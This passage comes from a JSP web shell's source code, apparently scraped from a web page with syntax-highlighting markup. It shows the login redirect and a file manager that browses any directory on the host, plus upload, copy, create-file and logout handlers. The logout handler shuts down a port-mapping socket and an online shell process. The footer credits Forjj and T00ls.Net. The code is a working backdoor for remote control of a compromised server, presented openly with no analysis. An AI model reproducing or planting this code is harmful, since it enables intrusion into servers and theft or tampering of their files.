class="vbscript">JSession.setAttribute(PW_SESSION_ATTRIBUTE,inputPw);</span></span><br><span class="line"><span class="vbscript"><span class="built_in">response</span>.sendRedirect(SHELL_NAME+<span class="string">"?o=index"</span>);</span></span><br><span class="line"><span class="vbscript">return;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125; catch (Exception e) &#123;</span></span><br><span class="line"><span class="vbscript">e.printStackTrace();</span></span><br><span class="line"><span class="vbscript">throw e ;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static <span class="keyword">class</span> MyComparator implements Comparator&lt;File&gt;&#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> <span class="built_in">int</span> compare(File f1,File f2) &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (f1 != <span class="literal">null</span> &amp;&amp; f2!= <span class="literal">null</span>) &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (f1.isDirectory()) &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (f2.isDirectory()) &#123;</span></span><br><span class="line"><span class="vbscript">return f1.getName().compareTo(f2.getName());</span></span><br><span class="line"><span class="vbscript">&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="vbscript">return <span class="number">-1</span>;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125; <span class="keyword">else</span> &#123; </span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (f2.isDirectory()) &#123;</span></span><br><span class="line"><span class="vbscript">return <span class="number">1</span>;</span></span><br><span class="line"><span class="vbscript">&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="vbscript">return  f1.getName().compareTo(f2.getName());</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">return <span class="number">0</span>;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static <span class="keyword">class</span> FileListInvoker extends DefaultInvoker &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void invoke(HttpServletRequest <span class="built_in">request</span>,HttpServletResponse <span class="built_in">response</span>,HttpSession JSession) throws Exception &#123;</span></span><br><span class="line"><span class="vbscript">try &#123;</span></span><br><span class="line"><span class="vbscript">PrintWriter out = <span class="built_in">response</span>.getWriter();</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> path = <span class="built_in">request</span>.getParameter(<span class="string">"folder"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (Util.<span class="built_in">isEmpty</span>(path))</span></span><br><span class="line"><span class="vbscript">path = JSession.getAttribute(CURRENT_DIR).toString();</span></span><br><span class="line"><span class="vbscript">JSession.setAttribute(CURRENT_DIR,Util.convertPath(path));</span></span><br><span class="line"><span class="vbscript">File file = <span class="keyword">new</span> File(path);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (!file.exists()) &#123;</span></span><br><span class="line"><span class="vbscript">throw <span class="keyword">new</span> Exception(path+<span class="string">"Dont Exists !"</span>);</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">JSession.setAttribute(CURRENT_DIR,path);</span></span><br><span class="line"><span class="vbscript">File[] list = file.listFiles();</span></span><br><span class="line"><span class="vbscript">Arrays.sort(list,<span class="keyword">new</span> MyComparator());</span></span><br><span class="line"><span class="vbscript">out.println(<span class="string">"&lt;div style='margin:10px'&gt;"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> cr = <span class="literal">null</span>;</span></span><br><span class="line"><span class="vbscript">try &#123;</span></span><br><span class="line"><span class="vbscript">cr = JSession.getAttribute(CURRENT_DIR).toString().substring(<span class="number">0</span>,<span class="number">3</span>);</span></span><br><span class="line"><span class="vbscript">&#125;catch(Exception e) &#123;</span></span><br><span class="line"><span class="vbscript">cr = <span class="string">"/"</span>;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">File currentRoot = <span class="keyword">new</span> File(cr);</span></span><br><span class="line"><span class="vbscript">out.println(<span class="string">"&lt;h2&gt;File Manager - Current disk &amp;quot;"</span>+(cr.indexOf(<span class="string">"/"</span>) == <span class="number">0</span>?<span class="string">"/"</span>:currentRoot.getPath())+<span class="string">"&amp;quot; total "</span>+Util.getSize(currentRoot.getTotalSpace(),<span class="comment">'G')+"&lt;/h2&gt;");</span></span></span><br><span class="line"><span class="vbscript">out.println(<span class="string">"&lt;form action=\""+SHELL_NAME+"</span>\<span class="string">" method=\"</span>post\<span class="string">"&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;table width=\"</span><span class="number">98</span>%\<span class="string">" border=\"</span><span class="number">0</span>\<span class="string">" cellpadding=\"</span><span class="number">0</span>\<span class="string">" cellspacing=\"</span><span class="number">0</span>\<span class="string">" style=\"</span>margin:<span class="number">10</span>px <span class="number">0</span>;\<span class="string">"&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"  &lt;tr&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"    &lt;td nowrap&gt;Current Directory  &lt;input type=\"</span>hidden\<span class="string">" name=\"</span>o\<span class="string">" value=\"</span>filelist\<span class="string">"/&gt;&lt;/td&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"	&lt;td width=\"</span><span class="number">98</span>%\<span class="string">"&gt;&lt;input class=\"</span>input\<span class="string">" name=\"</span>folder\<span class="string">" value=\""+JSession.getAttribute(CURRENT_DIR)+"</span>\<span class="string">" type=\"</span>text\<span class="string">" style=\"</span>width:<span class="number">100</span>%;margin:<span class="number">0</span> <span class="number">8</span>px;\<span class="string">"&gt;&lt;/td&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"    &lt;td nowrap&gt;&lt;input class=\"</span>bt\<span class="string">" value=\"</span>GO\<span class="string">" type=\"</span>submit\<span class="string">"&gt;&lt;/td&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"  &lt;/tr&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;/table&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;/form&gt;"</span>);</span></span><br><span class="line"><span class="vbscript">out.println(<span class="string">"&lt;table width=\"</span><span class="number">98</span>%\<span class="string">" border=\"</span><span class="number">0</span>\<span class="string">" cellpadding=\"</span><span class="number">4</span>\<span class="string">" cellspacing=\"</span><span class="number">0</span>\<span class="string">"&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;form action=\""+SHELL_NAME+"</span>?o=upload\<span class="string">" method=\"</span>POST\<span class="string">" enctype=\"</span>multipart/form-data\<span class="string">"&gt;&lt;tr class=\"</span>alt1\<span class="string">"&gt;&lt;td colspan=\"</span><span class="number">7</span>\<span class="string">" style=\"</span>padding:<span class="number">5</span>px;\<span class="string">"&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;div style=\"</span>float:<span class="built_in">right</span>;\<span class="string">"&gt;&lt;input class=\"</span>input\<span class="string">" name=\"</span>file\<span class="string">" value=\"</span>\<span class="string">" type=\"</span>file\<span class="string">" /&gt; &lt;input class=\"</span>bt\<span class="string">" name=\"</span>doupfile\<span class="string">" value=\"</span>Upload\<span class="string">" type=\"</span>submit\<span class="string">" /&gt;&lt;/div&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;a href=\"</span>javascript:<span class="keyword">new</span> fso(&#123;path:<span class="comment">'"+Util.convertPath(WEB_ROOT)+"'&#125;).subdir()\"&gt;Web Root&lt;/a&gt;"+</span></span></span><br><span class="line"><span class="vbscript"><span class="string">" | &lt;a href=\"</span>javascript:<span class="keyword">new</span> fso(&#123;path:<span class="comment">'"+Util.convertPath(SHELL_DIR)+"'&#125;).subdir()\"&gt;Shell Directory&lt;/a&gt;"+</span></span></span><br><span class="line"><span class="vbscript"><span class="string">" | &lt;a href=\"</span>javascript:<span class="keyword">new</span> fso(&#123;&#125;).mkdir()\<span class="string">"&gt;New Directory&lt;/a&gt; | &lt;a href=\"</span>javascript:<span class="keyword">new</span> fso(&#123;&#125;).createFile()\<span class="string">"&gt;New File&lt;/a&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">" | "</span>);</span></span><br><span class="line"><span class="vbscript">File[] roots = file.listRoots();</span></span><br><span class="line"><span class="vbscript"><span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>;i&lt;roots.length;i++) &#123;</span></span><br><span class="line"><span class="vbscript">File r = roots[i];</span></span><br><span class="line"><span class="vbscript">out.println(<span class="string">"&lt;a href=\"</span>javascript:<span class="keyword">new</span> fso(&#123;path:<span class="comment">'"+Util.convertPath(r.getPath())+"'&#125;).subdir();\"&gt;Disk("+Util.convertPath(r.getPath())+")&lt;/a&gt;");</span></span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (i != roots.length <span class="number">-1</span>) &#123;</span></span><br><span class="line"><span class="vbscript">out.println(<span class="string">"|"</span>);</span></span><br><span class="line"><span class="vbscript">&#125; </span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">out.println(<span class="string">"&lt;/td&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;/tr&gt;&lt;/form&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;tr class=\"</span>head\<span class="string">"&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"  &lt;td&gt;Name&lt;/td&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"  &lt;td width=\"</span><span class="number">16</span>%\<span class="string">"&gt;Last Modified&lt;/td&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"  &lt;td width=\"</span><span class="number">10</span>%\<span class="string">"&gt;Size&lt;/td&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"  &lt;td width=\"</span><span class="number">20</span>%\<span class="string">"&gt;Read/Write/Execute&lt;/td&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"  &lt;td width=\"</span><span class="number">22</span>%\<span class="string">"&gt;&amp;nbsp;&lt;/td&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;/tr&gt;"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (file.getParent() != <span class="literal">null</span>) &#123;</span></span><br><span class="line"><span class="vbscript">out.println(<span class="string">"&lt;tr class=alt1&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;td align=\"</span>center\<span class="string">"&gt;&lt;font face=\"</span>Wingdings <span class="number">3</span>\<span class="string">" size=4&gt;=&lt;/font&gt;&lt;/td&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;td nowrap colspan=\"</span><span class="number">5</span>\<span class="string">"&gt;&lt;a href=\"</span>javascript:<span class="keyword">new</span> fso(&#123;path:<span class="comment">'"+Util.convertPath(file.getAbsolutePath())+"'&#125;).parent()\"&gt;Goto Parent&lt;/a&gt;&lt;/td&gt;"+</span></span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;/tr&gt;"</span>);	</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="built_in">int</span> dircount = <span class="number">0</span>;</span></span><br><span class="line"><span class="vbscript"><span class="built_in">int</span> filecount = <span class="number">0</span>;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">for</span> (File f:list) &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (f.isDirectory()) &#123;</span></span><br><span class="line"><span class="vbscript">dircount ++;</span></span><br><span class="line"><span class="vbscript">out.println(<span class="string">"&lt;tr class=\"</span>alt2\<span class="string">" onMouseOver=\"</span>this.className=<span class="comment">'focus';\" onMouseOut=\"this.className='alt2';\"&gt;"+</span></span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;td width=\"</span><span class="number">2</span>%\<span class="string">" nowrap&gt;&lt;font face=\"</span>wingdings\<span class="string">" size=\"</span><span class="number">3</span>\<span class="string">"&gt;0&lt;/font&gt;&lt;/td&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;td&gt;&lt;a href=\"</span>javascript:<span class="keyword">new</span> fso(&#123;path:<span class="comment">'"+Util.convertPath(f.getAbsolutePath())+"'&#125;).subdir()\"&gt;"+f.getName()+"&lt;/a&gt;&lt;/td&gt;"+</span></span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;td nowrap&gt;"</span>+Util.formatDate(f.lastModified())+<span class="string">"&lt;/td&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;td nowrap&gt;--&lt;/td&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;td nowrap&gt;"</span>+f.canRead()+<span class="string">" / "</span>+f.canWrite()+<span class="string">" / "</span>+f.canExecute()+<span class="string">"&lt;/td&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;td nowrap&gt;&lt;a href=\"</span>javascript:<span class="keyword">new</span> fso(&#123;path:<span class="comment">'"+Util.convertPath(f.getAbsolutePath())+"',filename:'"+f.getName()+"'&#125;).removedir()\"&gt;Del&lt;/a&gt; | &lt;a href=\"javascript:new fso(&#123;path:'"+Util.convertPath(f.getAbsolutePath())+"'&#125;).move()\"&gt;Move&lt;/a&gt; | &lt;a href=\"javascript:new fso(&#123;path:'"+Util.convertPath(f.getAbsolutePath())+"',filename:'"+f.getName()+"'&#125;).pack()\"&gt;Pack&lt;/a&gt;&lt;/td&gt;"+</span></span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;/tr&gt;"</span>);</span></span><br><span class="line"><span class="vbscript">&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="vbscript">filecount++;</span></span><br><span class="line"><span class="vbscript">out.println(<span class="string">"&lt;tr class=\"</span>alt1\<span class="string">" onMouseOver=\"</span>this.className=<span class="comment">'focus';\" onMouseOut=\"this.className='alt1';\"&gt;"+</span></span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;td width=\"</span><span class="number">2</span>%\<span class="string">" nowrap&gt;&lt;input type='checkbox' value='"</span>+f.getName()+<span class="string">"'/&gt;&lt;/td&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;td&gt;&lt;a href=\"</span>javascript:<span class="keyword">new</span> fso(&#123;path:<span class="comment">'"+Util.convertPath(f.getAbsolutePath())+"'&#125;).down()\"&gt;"+f.getName()+"&lt;/a&gt;&lt;/td&gt;"+</span></span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;td nowrap&gt;"</span>+Util.formatDate(f.lastModified())+<span class="string">"&lt;/td&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;td nowrap&gt;"</span>+Util.getSize(f.length(),<span class="comment">'B')+"&lt;/td&gt;"+</span></span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;td nowrap&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">""</span>+f.canRead()+<span class="string">" / "</span>+f.canWrite()+<span class="string">" / "</span>+f.canExecute()+<span class="string">"&lt;/td&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;td nowrap&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;a href=\"</span>javascript:<span class="keyword">new</span> fso(&#123;path:<span class="comment">'"+Util.convertPath(f.getAbsolutePath())+"'&#125;).vEdit()\"&gt;Edit&lt;/a&gt; | "+</span></span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;a href=\"</span>javascript:<span class="keyword">new</span> fso(&#123;path:<span class="comment">'"+Util.convertPath(f.getAbsolutePath())+"'&#125;).down()\"&gt;Down&lt;/a&gt; | "+</span></span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;a href=\"</span>javascript:<span class="keyword">new</span> fso(&#123;path:<span class="comment">'"+Util.convertPath(f.getAbsolutePath())+"'&#125;).copy()\"&gt;Copy&lt;/a&gt; | "+</span></span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;a href=\"</span>javascript:<span class="keyword">new</span> fso(&#123;path:<span class="comment">'"+Util.convertPath(f.getAbsolutePath())+"'&#125;).move()\"&gt;Move&lt;/a&gt; | "+</span></span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;a href=\"</span>javascript:<span class="keyword">new</span> fso(&#123;path:<span class="comment">'"+Util.convertPath(f.getAbsolutePath())+"'&#125;).vEditProperty()\"&gt;Property&lt;/a&gt;");</span></span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (f.getName().endsWith(<span class="string">".zip"</span>)) &#123;</span></span><br><span class="line"><span class="vbscript">out.println(<span class="string">" | &lt;a href=\"</span>javascript:<span class="keyword">new</span> fso(&#123;path:<span class="comment">'"+Util.convertPath(f.getAbsolutePath())+"',filename:'"+f.getName()+"'&#125;).unpack()\"&gt;UnPack&lt;/a&gt;");</span></span></span><br><span class="line"><span class="vbscript">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (f.getName().endsWith(<span class="string">".rar"</span>)) &#123;</span></span><br><span class="line"><span class="vbscript">out.println(<span class="string">" | &lt;a href=\"</span>javascript:alert(<span class="comment">'Dont Support RAR,Please Use WINRAR');\"&gt;UnPack&lt;/a&gt;");</span></span></span><br><span class="line"><span class="vbscript">&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="vbscript">out.println(<span class="string">" | &lt;a href=\"</span>javascript:<span class="keyword">new</span> fso(&#123;path:<span class="comment">'"+Util.convertPath(f.getAbsolutePath())+"',filename:'"+f.getName()+"'&#125;).pack()\"&gt;Pack&lt;/a&gt;");</span></span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">out.println(<span class="string">"&lt;/td&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;/tr&gt;"</span>);</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">out.println(<span class="string">"&lt;tr class=\"</span>alt2\<span class="string">"&gt;&lt;td align=\"</span>center\<span class="string">"&gt;&amp;nbsp;&lt;/td&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"  &lt;td&gt;&lt;a href=\"</span>javascript:<span class="keyword">new</span> fso(&#123;&#125;).packBatch();\<span class="string">"&gt;Pack Selected&lt;/a&gt; - &lt;a href=\"</span>javascript:<span class="keyword">new</span> fso(&#123;&#125;).deleteBatch();\<span class="string">"&gt;Delete Selected&lt;/a&gt;&lt;/td&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"  &lt;td colspan=\"</span><span class="number">4</span>\<span class="string">" align=\"</span><span class="built_in">right</span>\<span class="string">"&gt;"</span>+dircount+<span class="string">" directories / "</span>+filecount+<span class="string">" files&lt;/td&gt;&lt;/tr&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;/table&gt;"</span>);</span></span><br><span class="line"><span class="vbscript">out.println(<span class="string">"&lt;/div&gt;"</span>);</span></span><br><span class="line"><span class="vbscript">&#125; catch (Exception e) &#123;</span></span><br><span class="line"><span class="vbscript">e.printStackTrace();</span></span><br><span class="line"><span class="vbscript">throw e;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static <span class="keyword">class</span> LogoutInvoker extends DefaultInvoker &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> boolean doBefore() &#123;return <span class="literal">false</span>;&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> boolean doAfter() &#123;return <span class="literal">false</span>;&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void invoke(HttpServletRequest <span class="built_in">request</span>,HttpServletResponse <span class="built_in">response</span>,HttpSession JSession) throws Exception&#123;</span></span><br><span class="line"><span class="vbscript">try &#123;</span></span><br><span class="line"><span class="vbscript">Object dbo = JSession.getAttribute(DBO);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (dbo != <span class="literal">null</span>)</span></span><br><span class="line"><span class="vbscript">((DBOperator)dbo).close();</span></span><br><span class="line"><span class="vbscript">Object obj = JSession.getAttribute(PORT_MAP);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (obj != <span class="literal">null</span>) &#123;</span></span><br><span class="line"><span class="vbscript">ServerSocket s = (ServerSocket)obj;</span></span><br><span class="line"><span class="vbscript">s.close();</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">Object online = JSession.getAttribute(SHELL_ONLINE);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (online != <span class="literal">null</span>)</span></span><br><span class="line"><span class="vbscript">((OnLineProcess)online).<span class="keyword">stop</span>();</span></span><br><span class="line"><span class="vbscript">JSession.invalidate();</span></span><br><span class="line"><span class="vbscript"><span class="built_in">response</span>.sendRedirect(SHELL_NAME+<span class="string">"?o=vLogin"</span>);</span></span><br><span class="line"><span class="vbscript">&#125; catch (Exception e) &#123;</span></span><br><span class="line"><span class="vbscript">e.printStackTrace();</span></span><br><span class="line"><span class="vbscript">throw e ;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static <span class="keyword">class</span> UploadInvoker extends DefaultInvoker &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> boolean doBefore() &#123;return <span class="literal">false</span>;&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> boolean doAfter() &#123;return <span class="literal">false</span>;&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void invoke(HttpServletRequest <span class="built_in">request</span>,HttpServletResponse <span class="built_in">response</span>,HttpSession JSession) throws Exception&#123;</span></span><br><span class="line"><span class="vbscript">try &#123;</span></span><br><span class="line"><span class="vbscript">UploadBean fileBean = <span class="keyword">new</span> UploadBean();</span></span><br><span class="line"><span class="vbscript"><span class="built_in">response</span>.getWriter().println(JSession.getAttribute(CURRENT_DIR).toString());</span></span><br><span class="line"><span class="vbscript">fileBean.setSavePath(JSession.getAttribute(CURRENT_DIR).toString());</span></span><br><span class="line"><span class="vbscript">fileBean.parseRequest(<span class="built_in">request</span>);</span></span><br><span class="line"><span class="vbscript">JSession.setAttribute(MSG,<span class="string">"Upload File Success!"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="built_in">response</span>.sendRedirect(SHELL_NAME+<span class="string">"?o=index"</span>);</span></span><br><span class="line"><span class="vbscript">&#125; catch (Exception e) &#123;</span></span><br><span class="line"><span class="vbscript">e.printStackTrace();</span></span><br><span class="line"><span class="vbscript">throw e ;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static <span class="keyword">class</span> CopyInvoker extends DefaultInvoker &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void invoke(HttpServletRequest <span class="built_in">request</span>,HttpServletResponse <span class="built_in">response</span>,HttpSession JSession) throws Exception&#123;</span></span><br><span class="line"><span class="vbscript">try &#123;</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> src = <span class="built_in">request</span>.getParameter(<span class="string">"src"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> <span class="keyword">to</span> = <span class="built_in">request</span>.getParameter(<span class="string">"to"</span>);</span></span><br><span class="line"><span class="vbscript">BufferedInputStream input = <span class="keyword">new</span> BufferedInputStream(<span class="keyword">new</span> FileInputStream(<span class="keyword">new</span> File(src)));</span></span><br><span class="line"><span class="vbscript">BufferedOutputStream output = <span class="keyword">new</span> BufferedOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="keyword">new</span> File(<span class="keyword">to</span>)));</span></span><br><span class="line"><span class="vbscript">byte[] d = <span class="keyword">new</span> byte[<span class="number">1024</span>];</span></span><br><span class="line"><span class="vbscript"><span class="built_in">int</span> <span class="built_in">len</span> = input.read(d);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">while</span>(<span class="built_in">len</span> != <span class="number">-1</span>) &#123;</span></span><br><span class="line"><span class="vbscript">output.write(d,<span class="number">0</span>,<span class="built_in">len</span>);</span></span><br><span class="line"><span class="vbscript"><span class="built_in">len</span> = input.read(d);</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">output.close();</span></span><br><span class="line"><span class="vbscript">input.close();</span></span><br><span class="line"><span class="vbscript">JSession.setAttribute(MSG,<span class="string">"Copy File Success!"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="built_in">response</span>.sendRedirect(SHELL_NAME+<span class="string">"?o=index"</span>);</span></span><br><span class="line"><span class="vbscript">&#125; catch (Exception e) &#123;</span></span><br><span class="line"><span class="vbscript">e.printStackTrace();</span></span><br><span class="line"><span class="vbscript">throw e ;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static <span class="keyword">class</span> BottomInvoker extends DefaultInvoker &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> boolean doBefore() &#123;return <span class="literal">false</span>;&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> boolean doAfter() &#123;return <span class="literal">false</span>;&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void invoke(HttpServletRequest <span class="built_in">request</span>,HttpServletResponse <span class="built_in">response</span>,HttpSession JSession) throws Exception&#123;</span></span><br><span class="line"><span class="vbscript">try &#123;</span></span><br><span class="line"><span class="vbscript"><span class="built_in">response</span>.getWriter().println(<span class="string">"&lt;div style=\"</span>padding:<span class="number">10</span>px;border-bottom:<span class="number">1</span>px solid #fff;border-top:<span class="number">1</span>px solid #ddd;background:#eee;\<span class="string">"&gt;Copyright (C) 2009 &lt;a href=\"</span>http://www.forjj.com\<span class="string">" target=\"</span>_blank\<span class="string">"&gt;http://www.Forjj.com/&lt;/a&gt;&amp;nbsp;&amp;nbsp;&lt;a target=\"</span>_blank\<span class="string">" href=\"</span>http://www.t00ls.net/\<span class="string">"&gt;[T00ls.Net]&lt;/a&gt; All Rights Reserved."</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;/div&gt;"</span>);</span></span><br><span class="line"><span class="vbscript">&#125; catch (Exception e) &#123;</span></span><br><span class="line"><span class="vbscript">e.printStackTrace();</span></span><br><span class="line"><span class="vbscript">throw e ;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static <span class="keyword">class</span> VCreateFileInvoker extends DefaultInvoker &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void invoke(HttpServletRequest <span class="built_in">request</span>,HttpServletResponse <span class="built_in">response</span>,HttpSession JSession) throws Exception&#123;</span></span><br><span class="line"><span class="vbscript">try &#123;</span></span><br><span class="line"><span class="vbscript">PrintWriter out = <span class="built_in">response</span>.getWriter();</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> path = <span class="built_in">request</span>.getParameter(<span class="string">"filepath"</span>);</span></span><br><span class="line"><span class="vbscript">File f = <span class="keyword">new</span> File(path);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (!f.isAbsolute()) &#123;</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> oldPath = path;</span></span><br><span class="line"><span class="vbscript">path = JSession.getAttribute(CURRENT_DIR).toString();</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (!path.endsWith(<span class="string">"/"</span>))</span></span><br><span class="line"><span class="vbscript">path+=<span class="string">"/"</span>;</span></span><br><span class="line"><span class="vbscript">path+=oldPath;</span></span><br><span class="line"><span class="vbscript">f = <span class="keyword">new</span> File(path);</span></span><br><span class="line"><span class="vbscript">f.createNewFile();</span></span><br><span class="line"><span class="vbscript">&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="vbscript">f.createNewFile();</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">out.println(<span class="string">"&lt;table width=\"</span><span class="number">100</span>%\<span class="string">" border=\"</span><span class="number">0</span>\<span class="string">" cellpadding=\"</span><span class="number">15</span>\<span class="string">" cellspacing=\"</span><span class="number">0</span>\<span class="string">"&gt;&lt;tr&gt;&lt;td&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;form name=\"</span>form1\<span class="string">" id=\"</span>form1\<span class="string">" action=\""+SHELL_NAME+"</span>\<span class="string">" method=\"</span>post\<span class="string">" 